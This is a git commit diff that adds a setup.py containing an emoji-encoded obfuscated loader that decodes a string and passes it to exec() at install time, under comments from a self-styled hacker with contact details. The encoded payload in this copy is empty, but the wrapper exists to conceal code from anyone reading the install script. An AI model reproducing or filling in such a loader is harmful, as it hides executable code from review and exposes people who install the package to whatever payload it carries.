497a71c45f9ed2bd7dfdc89823863fc2f9cbbbc7
nxnil105 <113341774+nxnil105@users.noreply.github.com>
2022-11-19 17:17:45 +0600

    Add files via upload

---
+++ setup.py
@@ -0,0 +1,7 @@
+# Encrypted by Nx Nil Choudhury
+# Whatsapp +8801914436101 
+# Facebook- https://www.facebook.com/VIP.HACKER.07.King.of.virtaul
+
+exec("".join(map(chr,[int("".join(str({'😀': 0, '😁': 3, '😂': 6, '😃': 1, '😄': 2, '😅': 4, '😉': 7, '😊': 8, '😛': 9, '🤣': 5}[i]) for i in x.split())) for x in
+""
+.split("  ")])))
